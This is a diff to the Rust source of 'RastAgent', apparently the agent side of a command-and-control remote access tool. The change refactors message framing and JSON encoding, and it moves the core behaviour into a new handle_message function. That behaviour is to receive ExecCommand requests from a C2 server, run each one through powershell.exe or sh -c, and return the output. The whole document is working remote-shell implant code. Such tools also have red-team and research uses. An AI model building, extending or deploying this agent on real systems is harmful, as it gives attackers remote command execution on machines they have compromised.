@@ -10,6 +10,7 @@ use bytes::Bytes;
 use commands::Commands;
 use futures_util::{sink::SinkExt, stream::StreamExt};
 use rast::{
+    encoding::{JsonPackager, Packager},
     messages::c2_agent::{AgentMessage, AgentResponse, C2Request},
     protocols::{tcp::TcpFactory, *},
     settings::Settings,
@@ -55,10 +56,11 @@ impl RastAgent {
         info!("RastAgent running");
 
         let mut conn = self.connection.lock().await;
-        let mut frame = get_rw_frame(conn.deref_mut(), BytesCodec::new());
+        let mut messager = Messager::new(conn.deref_mut());
+        let packager = JsonPackager::default();
 
         loop {
-            if let Some(bytes) = frame.next().await {
+            if let Some(bytes) = messager.next().await {
                 let bytes = match bytes {
                     Ok(bytes) => bytes,
                     Err(e) => {
@@ -66,7 +68,7 @@ impl RastAgent {
                         continue;
                     },
                 };
-                let msg: AgentMessage = match serde_json::from_slice(&bytes) {
+                let msg: AgentMessage = match packager.decode(&bytes.into()) {
                     Ok(msg) => {
                         info!("Request {:?}", msg);
                         msg
@@ -76,29 +78,14 @@ impl RastAgent {
                         continue;
                     },
                 };
-                let AgentMessage::C2Request(C2Request::ExecCommand(cmd)) = msg else {
-                    debug!("Got unsupported request: {:?}", msg);
-                    continue;
+
+                let response = self.handle_message(msg).await;
+
+                let Ok(response) = response else {
+                     continue
                 };
 
-                let output = if cfg!(target_os = "windows") {
-                    SystemCommand::new("powershell.exe")
-                        .arg("-c")
-                        .arg(cmd)
-                        .output()
-                        .await
-                } else {
-                    SystemCommand::new("sh").arg("-c").arg(cmd).output().await
-                };
-
-                info!("Response {:?}", output);
-                let response = match output {
-                    Ok(output) => String::from_utf8_lossy(&output.stdout).into(),
-                    Err(e) => e.to_string(),
-                };
-                let response =
-                    AgentMessage::AgentResponse(AgentResponse::CommandResponse(response));
-                let response = match serde_json::to_vec(&response) {
+                let response = match packager.encode(&response) {
                     Ok(serialized) => serialized,
                     Err(e) => {
                         info!(
@@ -109,11 +96,38 @@ impl RastAgent {
                     },
                 };
 
-                if let Err(e) = frame.send(Bytes::from(response)).await {
+                if let Err(e) = messager.send(response).await {
                     debug!("Failed to send response: {:?}", e);
                 };
             }
         }
+    }
+
+    async fn handle_message(&self, msg: AgentMessage) -> Result<AgentMessage, RastError> {
+        let AgentMessage::C2Request(C2Request::ExecCommand(cmd)) = msg else {
+            debug!("Got unsupported request: {:?}", msg);
+            return Err(RastError::Unknown);
+        };
+
+        let output = if cfg!(target_os = "windows") {
+            SystemCommand::new("powershell.exe")
+                .arg("-c")
+                .arg(cmd)
+                .output()
+                .await
+        } else {
+            SystemCommand::new("sh").arg("-c").arg(cmd).output().await
+        };
+
+        info!("Response {:?}", output);
+        let response = match output {
+            Ok(output) => String::from_utf8_lossy(&output.stdout).into(),
+            Err(e) => e.to_string(),
+        };
+
+        let response = AgentMessage::AgentResponse(AgentResponse::CommandResponse(response));
+
+        Ok(response)
     }
 }
 
